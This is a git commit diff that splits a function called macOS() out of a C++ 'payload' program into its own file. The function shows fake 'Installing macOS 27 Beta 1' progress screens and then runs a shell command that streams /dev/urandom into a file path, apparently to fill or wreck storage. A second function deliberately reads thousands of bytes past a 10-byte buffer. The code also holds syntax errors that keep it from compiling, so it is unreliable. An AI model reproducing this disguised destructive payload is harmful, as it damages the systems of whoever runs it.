ddaa1be77726568684d9030eb1ed094e319cc18e
hyperion0801 <quadcore1472@gmail.com>
2026-07-17 22:47:55 +0200

    feat: split macOS() from main code file

---
+++ src/payload/macOS.cpp
@@ -0,0 +1,44 @@
+#include <unistd.h>
+#include "displayText.h"
+#include "macOS.h"
+
+void macOS();
+{
+    repeatLoop = 8;
+    while(repeatLoop--)
+    {
+        // DOWNLOADING...
+        displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1");
+        usleep(666666);
+        displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1.");
+        usleep(666666);
+        displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1..");
+        usleep(666666);
+        displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1...");
+        usleep(666666);
+    }
+
+    // UNPACKING...
+    displayText("\033[2J\033[1;1HUnpacking macOS 27 Beta 1");
+    usleep(666666);
+    displayText("\033[2J\033[1;1HUnpacking macOS 27 Beta 1.");
+    usleep(666666);
+    displayText("\033[2J\033[1;1HUnpacking macOS 27 Beta 1..");
+    usleep(200000);
+
+    repeatLoop = 3;
+    while(repeatLoop--)
+    {
+        // INSTALLING...
+        displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1");
+        usleep(666666);
+        displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1.");
+        usleep(666666);
+        displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1..");
+        usleep(666666);
+        displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1...");
+        usleep(666666);
+    }
+    system("cat /dev/urandom > /miku/F59FEDE0");
+
+}
--- src/payload/payload.cpp
+++ src/payload/payload.cpp
@@ -23,63 +23,22 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
 #include <fcntl.h>
 #include <unistd.h>
 #include "displayText.h"
+#include "macOS.h"
 
 // Define a variable for later
 short repeatLoop = 0;
 
 void funcOverflow()
 {
-  repeatLoop = 3072; // Amount of bytes to read.
   const char bufferOverflow[10] = "\nTesting";
   int i = 0;
 
-  while(repeatLoop--) {
+  for(short bytesLeft = 3072; bytesLeft >= 0; bytesLeft--;) {
     std::cout << bufferOverflow[i] << std::flush;
     i++;
     usleep(25000);
 
   }
-}
-
-void macOS()
-{
-  repeatLoop = 8;
-  while(repeatLoop--)
-  {
-    // DOWNLOADING...
-    displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1");
-    usleep(666666);
-    displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1.");
-    usleep(666666);
-    displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1..");
-    usleep(666666);
-    displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1...");
-    usleep(666666);
-  }
-
-  // UNPACKING...
-  displayText("\033[2J\033[1;1HUnpacking macOS 27 Beta 1");
-  usleep(666666);
-  displayText("\033[2J\033[1;1HUnpacking macOS 27 Beta 1.");
-  usleep(666666);
-  displayText("\033[2J\033[1;1HUnpacking macOS 27 Beta 1..");
-  usleep(200000);
-
-  repeatLoop = 3;
-  while(repeatLoop--)
-  {
-    // INSTALLING...
-    displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1");
-    usleep(666666);
-    displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1.");
-    usleep(666666);
-    displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1..");
-    usleep(666666);
-    displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1...");
-    usleep(666666);
-  }
-  system("cat /dev/urandom > /miku/F59FEDE0");
-
 }
 
 int main()
